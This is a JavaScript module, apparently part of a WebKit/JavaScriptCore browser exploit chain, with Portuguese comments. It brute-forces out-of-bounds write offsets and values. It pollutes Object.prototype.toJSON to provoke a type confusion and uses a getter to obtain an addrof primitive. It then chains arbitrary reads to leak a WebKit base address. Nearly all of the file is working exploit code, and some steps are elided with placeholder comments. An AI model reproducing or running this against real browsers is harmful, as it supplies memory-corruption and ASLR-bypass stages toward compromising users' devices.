// js/script3/testArrayBufferVictimCrash.mjs (R43L - Testes Massivos Combinados: Addrof Getter + Análise Pós-OOB)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_CombinedMassive";

const VICTIM_BUFFER_SIZE = 256;
const CRITICAL_WRITE_OFFSETS_TO_TRY = [
    0x7C, 0x78, 0x80, 0x70, 0x6C, 0x5C, 0x8C,
    // Adicionar offsets próximos aos campos de metadados de TypedArray/ArrayBuffer se conhecidos
    // Ex: Se JSCell header for em X, e Structure* em X+8, testar X+4, X+C etc.
    // Esses são relativos ao início do objeto corrompido, que é desconhecido,
    // então estamos testando offsets relativos ao nosso ponto de escrita OOB.
];

const OOB_WRITE_VALUES_TO_TRY = [
    0xABABABAB, 0xCDCDCDCD, 0x12345678, 0x87654321,
    0x00000000, 0x00000001, 0x00000002, // Pequenos inteiros, IDs de estrutura potenciais
    0xFFFFFFFF, 0x7FFFFFFF,
    (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 0xFFFF0002), // Usar ID conhecido ou um placeholder
    // Adicionar outros StructureIDs conhecidos se disponíveis e não nulos
    // (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSString_STRUCTURE_ID || 0xFFFF0003),
];

const FILL_PATTERN_VICTIM_BUFFER = Math.random(); // Padrão para o buffer vítima na tentativa de addrof via getter
const FILL_PATTERN_POST_OOB_ANALYSIS = 0xDEADBEEF; // Padrão para a análise separada do buffer pós-OOB

const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak;
let leaked_target_function_addr = null;

// isValidPointer (sem alterações)
function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) {
        logS3(`[isValidPointer-${context}] Input não é AdvancedInt64Object: ${String(ptr)}`, "debug_detail");
        return false;
    }
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0x7FF80000 && low === 0x0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Testes Massivos Combinados ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init CombinedMassive...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR43L_CombinedMassive() { return `target_R43L_CombinedMassive_${Date.now()}`; };
    logS3(`Função alvo (targetFunctionForLeak) definida.`, 'info');

    logS3(`--- Fase 0 (CombinedMassive): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    } catch (e_sanity) {
        logS3(`Erro Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE); coreOOBReadWriteOK = false;
    }
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) {
        return { errorOccurred: "OOB Sanity Check Failed", /* ... outros campos de erro ... */ tc_probe_details: null, stringifyResult: null, addrof_result: { success: false, msg: "Addrof: Not run", leaked_object_addr: null, leaked_object_addr_candidate_str: null }, webkit_leak_result: { success: false, msg: "WebKit Leak: Not run", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null }, iteration_results_summary: [], total_probe_calls_last_iter: 0, oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false, post_oob_victim_buffer_analysis_best_result: null };
    }

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (CombinedMassive): Not run.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (CombinedMassive): Not run.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
        oob_params_of_best_result: null, // { offset: hex, value: hex, raw_offset: num, raw_value: num }
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        post_oob_victim_buffer_analysis_best_result: null
    };
    let final_probe_call_count_for_report = 0;

    for (const current_critical_offset of CRITICAL_WRITE_OFFSETS_TO_TRY) {
        for (const current_oob_value of OOB_WRITE_VALUES_TO_TRY) {
            if (current_oob_value === null || typeof current_oob_value === 'undefined') continue;

            leaked_target_function_addr = null;
            const current_oob_hex_val = toHex(current_oob_value);
            const current_offset_hex = toHex(current_critical_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_OOB${current_oob_hex_val}`;
            logS3(`\n===== ITERATION CombinedMassive: Offset: ${current_offset_hex}, OOB Value: ${current_oob_hex_val} (Raw: ${current_oob_value}) =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Testing Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let probe_call_count_iter = 0;
            let victim_typed_array_for_getter_addrof = null; // Para a tentativa de addrof via getter
            let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
            let iteration_final_tc_details_from_probe = null;
            let iteration_tc_first_detection_done = false;
            let iter_addrof_result = { success: false, msg: "Addrof: Not run.", leaked_object_addr: null, leaked_object_addr_candidate_str: null };
            let iter_post_oob_analysis_details = { buffer_initial_head: [], buffer_fill_pattern_found: false, notes: ""};
            let heisenbugConfirmedThisIter = false;


            function toJSON_TA_Probe_Iter_Closure_Combined() {
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    // Usar victim_typed_array_for_getter_addrof para a checagem inicial do 'this'
                    if (call_num === 1 && this === victim_typed_array_for_getter_addrof) {
                        marker_M2_ref_iter = { marker_id_combined: "M2_Iter_Combined" };
                        marker_M1_ref_iter = { marker_id_combined: "M1_Iter_Combined", payload_M2: marker_M2_ref_iter };
                        logS3(`[PROBE_Combined] Call #${call_num}: 'this' é victim_typed_array_for_getter_addrof. M1/M2 criados.`, "debug");
                        return marker_M1_ref_iter;
                    } else if (is_m2c) {
                        if (!iteration_tc_first_detection_done) {
                            iteration_tc_first_detection_done = true;
                            heisenbugConfirmedThisIter = true; // TC Confirmada para esta iteração
                            iteration_final_tc_details_from_probe = {
                                call_number_tc_detected: call_num, probe_variant: "TA_Probe_Combined", this_type: ctts,
                                this_is_M2: true, getter_defined: false, getter_fired: false,
                                leak_val_getter_int64: null, leak_val_getter_is_ptr: false, error_probe: null
                            };
                            logS3(`[PROBE_Combined] Call #${call_num} (M2C): FIRST TC. ID:${this.marker_id_combined}. Definindo getter...`, "vuln");

                            try {
                                Object.defineProperty(this, 'leaky_addr_getter_Combined', {
                                    get: function() {
                                        // ... (Conteúdo do getter com diagnósticos, como na versão "Diagnóstico Getter")
                                        logS3(`[PROBE_GETTER_Combined] Getter 'leaky_addr_getter_Combined' ACIONADO!`, "vuln");
                                        if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_fired = true;

                                        if (!victim_typed_array_for_getter_addrof?.buffer) {
                                            iter_addrof_result.msg = "AddrofGetter: victim_typed_array_for_getter_addrof.buffer é nulo.";
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = "addrof_victim_null";
                                            return "getter_victim_null";
                                        }
                                        // ... (resto das verificações do getter)

                                        logS3(`[GETTER_DIAG_Combined] --- Início Diagnóstico do Getter ---`, "info_emphasis");
                                        let float_view = new Float64Array(victim_typed_array_for_getter_addrof.buffer);
                                        let uint32_view = new Uint32Array(victim_typed_array_for_getter_addrof.buffer);
                                        // ... (diagnósticos como antes)
                                        const original_low_u32 = uint32_view[0]; const original_high_u32 = uint32_view[1];
                                        logS3(`[GETTER_DIAG_Combined] ANTES escrita: L=0x${original_low_u32.toString(16)}, H=0x${original_high_u32.toString(16)}`, "leak_detail");

                                        float_view[0] = targetFunctionForLeak;
                                        logS3(`[GETTER_DIAG_Combined] APÓS escrita: typeof float_view[0]=${typeof float_view[0]}, val=${float_view[0]}, ===target: ${float_view[0] === targetFunctionForLeak}`, "leak");
                                        const immediate_low_u32 = uint32_view[0]; const immediate_high_u32 = uint32_view[1];
                                        logS3(`  Uint32 (imediato): L=0x${immediate_low_u32.toString(16)}, H=0x${immediate_high_u32.toString(16)}`, "leak");
                                        // ... (fim dos diagnósticos imediatos)

                                        try {
                                            const leaked_low = uint32_view[0]; const leaked_high = uint32_view[1];
                                            if (leaked_low !== immediate_low_u32 || leaked_high !== immediate_high_u32) {
                                                 logS3(`[GETTER_DIAG_WARN_Combined] DISCREPÂNCIA leitura imediata/final!`, "critical");
                                            }
                                            const potential_addr = new AdvancedInt64(leaked_low, leaked_high);
                                            iter_addrof_result.leaked_object_addr_candidate_str = potential_addr.toString(true);
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = iter_addrof_result.leaked_object_addr_candidate_str;

                                            if (isValidPointer(potential_addr, "_getterAddrof_Combined")) {
                                                leaked_target_function_addr = potential_addr;
                                                iter_addrof_result.leaked_object_addr = leaked_target_function_addr.toString(true);
                                                iter_addrof_result.success = true;
                                                iter_addrof_result.msg = "AddrofGetter: Sucesso.";
                                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_is_ptr = true;
                                                logS3(`[PROBE_GETTER_Combined] SUCESSO ADDR! Addr: ${leaked_target_function_addr.toString(true)}`, "vuln");
                                                return "getter_addrof_success";
                                            } else {
                                                iter_addrof_result.msg = `AddrofGetter: Endereço candidato (${potential_addr.toString(true)}) inválido.`;
                                                return "getter_addrof_invalid_ptr";
                                            }
                                        } catch (e_addrof_getter) {
                                            iter_addrof_result.msg = `AddrofGetter EXCEPTION: ${e_addrof_getter.message}`;
                                            return "getter_addrof_exception";
                                        } finally {
                                            uint32_view[0] = original_low_u32; uint32_view[1] = original_high_u32;
                                            logS3(`[GETTER_DIAG_Combined] Buffer restaurado. --- Fim Diagnóstico Getter ---`, "info_emphasis");
                                        }
                                    },
                                    enumerable: true, configurable: true
                                });
                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_defined = true;
                            } catch (e_def_getter) {
                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `DefineGetterErr: ${e_def_getter.message}`;
                            }
                        }
                        return this;
                    }
                } catch (e_pm_probe) {
                    if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `ProbeMainErr:${e_pm_probe.message}`;
                }
                return { gen_m: call_num, type: ctts };
            }


            let iter_primary_error = null;
            let iter_raw_stringify_output = null;
            let iter_stringify_output_parsed = null;
            let iter_webkit_leak_result = { success: false, msg: "WebKit Leak: Not run.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null };


            try {
                // --- Parte 1: Análise Pós-OOB do Buffer Vítima (antes da tentativa de TC/Addrof) ---
                logS3(`  --- Sub-Fase A (CombinedMassive): Escrita OOB e Análise do Buffer Vítima ---`, "subtest", FNAME_CURRENT_ITERATION);
                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetupA` });
                oob_write_absolute(current_critical_offset, current_oob_value, 4);
                logS3(`   OOB Write A: Escrito ${current_oob_hex_val} no offset ${current_offset_hex}`, 'info');
                await PAUSE_S3(50);

                const victim_buffer_for_analysis = new ArrayBuffer(VICTIM_BUFFER_SIZE);
                const victim_u32_view_for_analysis = new Uint32Array(victim_buffer_for_analysis);
                victim_u32_view_for_analysis.fill(FILL_PATTERN_POST_OOB_ANALYSIS);
                logS3(`   Buffer para Análise Pós-OOB criado (padrão 0x${FILL_PATTERN_POST_OOB_ANALYSIS.toString(16)}).`, 'debug_detail');
                await PAUSE_S3(100);

                logS3(`   Analisando victim_buffer_for_analysis (primeiros 64 bytes):`, 'info_emphasis');
                let temp_u8_view = new Uint8Array(victim_buffer_for_analysis, 0, Math.min(64, VICTIM_BUFFER_SIZE));
                let pattern_found_in_analysis_buffer = true;
                let non_pattern_count = 0;
                for (let i = 0; i < temp_u8_view.length / 4; i++) {
                    let val = victim_u32_view_for_analysis[i];
                    iter_post_oob_analysis_details.buffer_initial_head.push(val);
                    if (val !== FILL_PATTERN_POST_OOB_ANALYSIS) {
                        pattern_found_in_analysis_buffer = false; non_pattern_count++;
                    }
                    if (i < 16) logS3(`     analysis_buffer[${i*4}] (U32 idx ${i}): 0x${val.toString(16)} ${val === FILL_PATTERN_POST_OOB_ANALYSIS ? "" : "<- DIF!"}`, 'leak_detail');
                }
                iter_post_oob_analysis_details.buffer_fill_pattern_found = pattern_found_in_analysis_buffer;
                if (pattern_found_in_analysis_buffer) {
                    iter_post_oob_analysis_details.notes = "Padrão de preenchimento (0xDEADBEEF) encontrado consistentemente.";
                } else {
                    iter_post_oob_analysis_details.notes = `Padrão (0xDEADBEEF) NÃO encontrado em ${non_pattern_count} posições. Buffer pode estar corrompido.`;
                }
                logS3(`   Análise Pós-OOB: ${iter_post_oob_analysis_details.notes}`, pattern_found_in_analysis_buffer ? 'good' : 'vuln_potential');
                await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-ClearAfterAnalysis`}); // Limpar antes da próxima tentativa


                // --- Parte 2: Tentativa de TC e Addrof via Getter ---
                logS3(`  --- Sub-Fase B (CombinedMassive): Detecção de TC & Addrof via Getter ---`, "subtest", FNAME_CURRENT_ITERATION);
                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetupB` });
                oob_write_absolute(current_critical_offset, current_oob_value, 4);
                logS3(`   OOB Write B: Escrito ${current_oob_hex_val} no offset ${current_offset_hex}`, 'info');
                await PAUSE_S3(150);

                victim_typed_array_for_getter_addrof = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
                new Float64Array(victim_typed_array_for_getter_addrof.buffer).fill(FILL_PATTERN_VICTIM_BUFFER); // Padrão diferente para este buffer
                logS3(`   Victim TypedArray para AddrofGetter criado (padrão ${FILL_PATTERN_VICTIM_BUFFER}).`, 'debug_detail');

                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_Combined, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    iter_raw_stringify_output = JSON.stringify(victim_typed_array_for_getter_addrof); // Aciona a sonda
                    try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output, msg: e_p.message }; }

                    if (heisenbugConfirmedThisIter) { // heisenbugConfirmedThisIter é setado pela sonda
                        logS3(`  TC Probe (CombinedMassive): TC on M2 CONFIRMED. Addrof success: ${iter_addrof_result.success}. Addr: ${iter_addrof_result.leaked_object_addr || iter_addrof_result.leaked_object_addr_candidate_str || 'N/A'}`, iter_addrof_result.success ? "vuln" : "warn");
                    } else {
                        logS3(`  TC Probe (CombinedMassive): TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");
                    }
                } catch (e_str) {
                    if (!iter_primary_error) iter_primary_error = e_str;
                    logS3(`  TC/Addrof Probe (CombinedMassive): JSON.stringify EXCEPTION: ${e_str.message}`, "error");
                    if (!iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe = {};
                    iteration_final_tc_details_from_probe.error_probe = (iteration_final_tc_details_from_probe.error_probe || "") + ` StringifyErr: ${e_str.message}`;
                } finally {
                    if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; }
                }
                logS3(`  --- Sub-Fase B Concluída. TC M2: ${heisenbugConfirmedThisIter}. Addrof Sucesso: ${iter_addrof_result.success} ---`, "subtest");
                await PAUSE_S3(100);

                // --- Parte 3: Tentativa de WebKit Leak (se addrof teve sucesso) ---
                logS3(`  --- Sub-Fase C (CombinedMassive): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
                if (iter_addrof_result.success && leaked_target_function_addr) { // Apenas se addrof funcionou
                    if (!isOOBReady()) await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetupC` });
                    if (!isOOBReady()) {
                        iter_webkit_leak_result.msg = "WebKit Leak: Falha ao preparar OOB para arb_read.";
                    } else {
                        try {
                            // ... (Lógica do WebKit Leak, como antes)
                            const ptr_to_executable_instance = await arb_read(leaked_target_function_addr.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                            // ... validação e leitura do ptr_to_jit_or_vm ...
                            // ... cálculo do webkit_base_candidate ...
                             iter_webkit_leak_result.internal_ptr_stage1 = isAdvancedInt64Object(ptr_to_executable_instance) ? ptr_to_executable_instance.toString(true) : String(ptr_to_executable_instance);
                            if (!isValidPointer(ptr_to_executable_instance, "_execInst_CM")) throw new Error(`Ptr ExecInstance inválido: ${iter_webkit_leak_result.internal_ptr_stage1}`);
                            const ptr_to_jit_or_vm = await arb_read(ptr_to_executable_instance.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                            iter_webkit_leak_result.internal_ptr_stage2 = isAdvancedInt64Object(ptr_to_jit_or_vm) ? ptr_to_jit_or_vm.toString(true) : String(ptr_to_jit_or_vm);
                            if (!isValidPointer(ptr_to_jit_or_vm, "_jitVm_CM")) throw new Error(`Ptr JIT/VM inválido: ${iter_webkit_leak_result.internal_ptr_stage2}`);
                            const webkit_base_candidate = ptr_to_jit_or_vm.and(new AdvancedInt64(0x0, ~0xFFF));
                            iter_webkit_leak_result.webkit_base_candidate = webkit_base_candidate.toString(true);
                            iter_webkit_leak_result.success = true;
                            iter_webkit_leak_result.msg = `WebKitLeak: Candidato base: ${webkit_base_candidate.toString(true)}`;
                            logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");
                        } catch (e_wl) {
                            iter_webkit_leak_result.msg = `WebKitLeak EXCEPTION: ${e_wl.message}`;
                            if(!iter_primary_error) iter_primary_error = e_wl;
                        }
                    }
                } else {
                    iter_webkit_leak_result.msg = "WebKit Leak: Pulado (Addrof falhou ou TC não confirmada).";
                }
                logS3(`  --- Sub-Fase C Concluída. WebKitLeak Sucesso: ${iter_webkit_leak_result.success} ---`, "subtest");

            } catch (e_outer_iter) {
                if (!iter_primary_error) iter_primary_error = e_outer_iter;
                logS3(`  CRITICAL ERROR ITERATION (CombinedMassive): ${e_outer_iter.message}`, "critical");
            } finally {
                await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearCombined`});
            }

            final_probe_call_count_for_report = probe_call_count_iter;
            let current_iter_summary = {
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val, raw_oob_value: current_oob_value, raw_critical_offset: current_critical_offset,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: iteration_final_tc_details_from_probe,
                stringifyResult: iter_stringify_output_parsed,
                addrof_result_this_iter: iter_addrof_result,
                webkit_leak_result_this_iter: iter_webkit_leak_result,
                heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter,
                post_oob_victim_buffer_analysis_this_iter: iter_post_oob_analysis_details
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica de best_result_for_runner (priorizar WebKitLeak > Addrof > TC+BufferCorrupt > TC > BufferCorrupt)
            if (current_iter_summary.error === null) {
                let current_is_better_than_best = false;
                if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_params_of_best_result === null) {
                    current_is_better_than_best = true;
                } else {
                    const score = (current_iter_summary.webkit_leak_result_this_iter.success ? 8 : 0) +
                                  (current_iter_summary.addrof_result_this_iter.success ? 4 : 0) +
                                  (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe && !current_iter_summary.post_oob_victim_buffer_analysis_this_iter.buffer_fill_pattern_found ? 3 : 0) +
                                  (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 2 : 0) +
                                  (!current_iter_summary.post_oob_victim_buffer_analysis_this_iter.buffer_fill_pattern_found ? 1 : 0);
                    const best_score_val = (best_result_for_runner.webkit_leak_result.success ? 8 : 0) +
                                       (best_result_for_runner.addrof_result.success ? 4 : 0) +
                                       (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe && best_result_for_runner.post_oob_victim_buffer_analysis_best_result && !best_result_for_runner.post_oob_victim_buffer_analysis_best_result.buffer_fill_pattern_found ? 3 : 0) +
                                       (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 2 : 0) +
                                       (best_result_for_runner.post_oob_victim_buffer_analysis_best_result && !best_result_for_runner.post_oob_victim_buffer_analysis_best_result.buffer_fill_pattern_found ? 1 : 0);
                    if (score > best_score_val) current_is_better_than_best = true;
                }
                if (current_is_better_than_best) {
                    best_result_for_runner = {
                        errorOccurred: null,
                        tc_probe_details: current_iter_summary.tc_probe_details,
                        stringifyResult: current_iter_summary.stringifyResult,
                        addrof_result: current_iter_summary.addrof_result_this_iter,
                        webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                        oob_params_of_best_result: { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_critical_offset, raw_value: current_oob_value },
                        heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe,
                        post_oob_victim_buffer_analysis_best_result: current_iter_summary.post_oob_victim_buffer_analysis_this_iter
                    };
                     logS3(`*** NOVO MELHOR RESULTADO (CombinedMassive) Off: ${current_offset_hex}, Val: ${current_oob_hex_val} ***`, "success_major");
                }
            } else if (best_result_for_runner.oob_params_of_best_result === null && current_critical_offset === CRITICAL_WRITE_OFFSETS_TO_TRY[CRITICAL_WRITE_OFFSETS_TO_TRY.length -1] && current_oob_value === OOB_WRITE_VALUES_TO_TRY[OOB_WRITE_VALUES_TO_TRY.length-1]) {
                 best_result_for_runner = { ...current_iter_summary, oob_params_of_best_result: { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_critical_offset, raw_value: current_oob_value } };
            }


            // Atualizar título da página durante a iteração
            let iterStatus = "Iter Done";
            if (iter_webkit_leak_result.success) iterStatus = "WebKitLeak OK!";
            else if (iter_addrof_result.success) iterStatus = "Addrof OK";
            else if (heisenbugConfirmedThisIter && !iter_post_oob_analysis_details.buffer_fill_pattern_found) iterStatus = "TC & BufCorrupt";
            else if (heisenbugConfirmedThisIter) iterStatus = "TC OK";
            else if (!iter_post_oob_analysis_details.buffer_fill_pattern_found) iterStatus = "BufCorrupt";
            document.title = `${FNAME_CURRENT_TEST_BASE} ${iterStatus} (O:${current_offset_hex} V:${current_oob_hex_val})`;

            await PAUSE_S3(100);
        }
        await PAUSE_S3(250);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test");
    logS3(`Best/Final result (CombinedMassive): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug");

    // Título final
    let finalStatus = "No Success";
    if(best_result_for_runner.webkit_leak_result.success) finalStatus = "WebKitLeak SUCCESS!";
    else if (best_result_for_runner.addrof_result.success) finalStatus = "Addrof SUCCESS!";
    else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe && best_result_for_runner.post_oob_victim_buffer_analysis_best_result && !best_result_for_runner.post_oob_victim_buffer_analysis_best_result.buffer_fill_pattern_found) finalStatus = "TC & Buffer Corrupt!";
    else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) finalStatus = "TC OK";
    else if (best_result_for_runner.post_oob_victim_buffer_analysis_best_result && !best_result_for_runner.post_oob_victim_buffer_analysis_best_result.buffer_fill_pattern_found) finalStatus = "Buffer Corrupt";
    else if (best_result_for_runner.errorOccurred) finalStatus = `Error - ${best_result_for_runner.errorOccurred}`;
    document.title = `${FNAME_CURRENT_TEST_BASE}_Final: ${finalStatus}`;

    return {
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_params_of_best_result: best_result_for_runner.oob_params_of_best_result,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
        post_oob_victim_buffer_analysis_best_result: best_result_for_runner.post_oob_victim_buffer_analysis_best_result
    };
}
